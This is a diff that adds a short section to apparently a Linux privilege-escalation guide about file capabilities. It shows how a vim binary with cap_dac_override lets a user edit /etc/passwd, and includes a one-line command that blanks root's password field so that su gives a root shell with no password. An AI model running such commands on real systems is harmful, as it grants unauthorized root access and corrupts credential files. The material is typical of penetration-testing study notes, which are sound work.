@@ -134,3 +134,18 @@ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \
 ```
 
 ### Exploitation Capabilities
+
+```shell
+# check vim
+$ getcap /usr/bin/vim.basic
+
+/usr/bin/vim.basic cap_dac_override=eip
+
+# We can use the cap_dac_override capability of the /usr/bin/vim binary to modify a system file:
+/usr/bin/vim.basic /etc/passwd
+
+# or
+echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
+
+# Now, we can see that the x in that line is gone, which means that we can use the command su to log in as root without being asked for the password.
+```
